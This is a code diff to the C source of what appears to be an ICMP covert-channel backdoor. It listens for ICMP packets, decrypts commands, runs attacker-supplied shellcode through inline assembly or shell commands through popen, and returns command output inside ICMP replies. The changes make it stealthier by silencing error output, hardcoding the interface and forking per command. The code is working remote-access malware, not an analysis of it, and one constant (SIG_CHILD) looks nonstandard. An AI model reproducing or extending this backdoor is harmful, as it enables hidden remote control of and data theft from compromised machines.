@@ -57,7 +57,7 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 
 					// Not going to worry about failures
 					if(sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) <= 0) {
-						fprintf(stderr, "Unable to send packet\n");
+						DEBUG_WRAP(fprintf(stderr, "Unable to send packet\n"));
 					}
 
 					close(output_socket);
@@ -69,8 +69,6 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 
 void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	unsigned char *executable = NULL, *new_stack = NULL;
-	void (*function)();
-	int pid, status;
 	
 	// We need some more memory to work
 	if(executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
@@ -78,56 +76,64 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 		// Copy our prefix and shellcode in
 		memcpy(executable, shellcode, size);
 
-		// Set up the function pointer
-		function = (void *)executable;
-
 		// Create a new stack area for payloads that need writable/executable stack	
 		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
 
-			// Hopefully this works
-			if((pid = fork()) >= 0) {
-
-				if(pid == 0) {
-
-					// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
-					__asm__("mov %edx,%esp");
-
-					// Now call the shellcode
-					function();
-
-					// Make sure we exit the child cleanly
-					exit(0);
-				}
-				else {
-					waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
-				}
-			}
+			// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
+			__asm__("mov 0xfffffff0(%ebp),%esp");
+			__asm__("mov 0xfffffff4(%ebp),%eax");
+			__asm__("add $0x0100, %esp");
+			__asm__("jmp *%eax");
 		}
 	}
 }
 
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	FILE *fd = NULL;
-	uint8_t cmd[size + 1], buf[MAX_PACKET_SIZE], msg[MAX_PACKET_SIZE + strlen(MAGIC) + 1];
-	uint32_t read = 0, cmd_size = size + 1;
+	uint8_t buf[MAX_PACKET_SIZE], msg[MAX_PACKET_SIZE + strlen(MAGIC) + 1], *msg_data;
+	uint32_t read = 0;
+	uint32_t msg_hdr_size = strlen(MAGIC) + 1;
+	uint32_t msg_size = sizeof(msg);
+	uint32_t msg_data_size = msg_size - msg_hdr_size;
+	uint32_t cmd_size = size + strlen(REDIRECT) + 1;
+	uint8_t cmd[cmd_size];
 
 	// Need to copy and null terminate the command
 	memset(cmd, 0, cmd_size);
 	memcpy(cmd, command, size);
+	strncat(cmd, REDIRECT, cmd_size);
 
 	// Set the response magic and type
-	memcpy(msg, MAGIC, strlen(MAGIC));
-	msg[strlen(MAGIC)] = '\x02';
+	memset(msg, 0, msg_size);
+	strncat(msg, MAGIC, msg_size);
+	strncat(msg, "\x02", msg_size);
+
+	// Quack
+	msg_data = msg + msg_hdr_size;
+	
+	// Zero out buf as well
+	memset(buf, 0, sizeof(buf));
 
 	// Execute the command
 	if((fd = popen(cmd, "r")) != NULL) {
-
 		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {
-			memcpy(msg + strlen(MAGIC) + 1, buf, read);
 
-			send_packet(msg, read, ip, icmp);
-			printf("%s\n", buf);
+			// Need to pad if there isn't enough data (already nulled out)
+			if(read < 18) {
+				read = 18;
+			}
+
+			// Add the data to the already created packet header
+			memcpy(msg_data, buf, read);
+			send_packet(msg, read + msg_hdr_size, ip, icmp);
+
+			// Zero out everything for the next bit of data
+			memset(buf, 0, sizeof(buf));
+			memset(msg_data, 0, msg_data_size);
+			fflush(fd);
 		}
+
+		pclose(fd);
 	}
 }
 
@@ -145,7 +151,7 @@ int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint
 void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	unsigned char decoded_data[size];
 	unsigned char *key = (unsigned char *)&(icmp->checksum);
-	uint32_t data_len = 0, hdr_len = 0;
+	uint32_t data_len = 0, hdr_len = 0, pid = 0, status = 0;
 	uint8_t msg_type = 0;
 
 	// Make sure we have data
@@ -161,13 +167,26 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 				msg_type = decoded_data[hdr_len - 1];
 
 				// First byte should be the message type
-				switch(msg_type) {
-					case MESSAGE_SHELLCODE:
-						run_shellcode(decoded_data + hdr_len, data_len);
-						break;
-					case MESSAGE_COMMAND:
-						run_command(decoded_data + hdr_len, data_len, ip, icmp);
-						break;
+				if((pid = fork()) >= 0) {
+					
+					// Make sure we are in the child
+					if(pid == 0) {
+						switch(msg_type) {
+							case MESSAGE_SHELLCODE:
+								DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
+								run_shellcode(decoded_data + hdr_len, data_len);
+								break;
+							case MESSAGE_COMMAND:
+								DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
+								run_command(decoded_data + hdr_len, data_len, ip, icmp);
+								break;
+						}
+
+						exit(0);
+					}
+					else {
+						waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
+					}
 				}
 			}
 		}
@@ -203,54 +222,47 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 }
 
 int main(int argc, char *argv[0]) {
-	char *iface = NULL;
 	pcap_t *handle = NULL;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	struct bpf_program fp;
 	bpf_u_int32 mask, net;
 	char bpf_filter[] = "icmp";
 
-	// Did we get an interface to work with?
-	if(argc != 2) {
-		fprintf(stderr, "Usage: %s <iface>\n", argv[0]);
-		return -1;
-	}
-
 	// Seed random for later
 	srand(time(NULL));
 
-	// Yay, we have an interface
-	iface = argv[1];
-
 	// Opening the pcap device
-	if((handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf)) == NULL) {
-		fprintf(stderr, "Error opening device %s: %s\n", iface, errbuf);
+	if((handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf)) == NULL) {
+		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", INTERFACE, errbuf));
 		return -1;
 	}
 
 	// Need some extra information about the network interface
-	if(pcap_lookupnet(iface, &net, &mask, errbuf)) {
-		fprintf(stderr, "Error getting interface information for %s: %s\n", iface, errbuf);
+	if(pcap_lookupnet(INTERFACE, &net, &mask, errbuf)) {
+		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s: %s\n", INTERFACE, errbuf));
 		return -1;
 	}
 
 	// Make sure we got information
 	if((mask == 0) || (net == 0)) {
-		fprintf(stderr, "Error getting interface information for %s\n", iface);
+		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s\n", INTERFACE));
 		return -1;
 	}
 
 	// We only want to see ICMP traffic
 	if(pcap_compile(handle, &fp, bpf_filter, 0, mask)) {
-		fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
+		DEBUG_WRAP(fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
 		return -1;
 	}
 
 	// Finally set up our filter
 	if(pcap_setfilter(handle, &fp)) {
-		fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
+		DEBUG_WRAP(fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
 		return -1;
 	}
+
+	// We don't care about children
+	signal(SIG_CHILD, SIG_IGN);
 
 	// Now we can finally sniff
 	pcap_loop(handle, -1, process_packet, NULL);
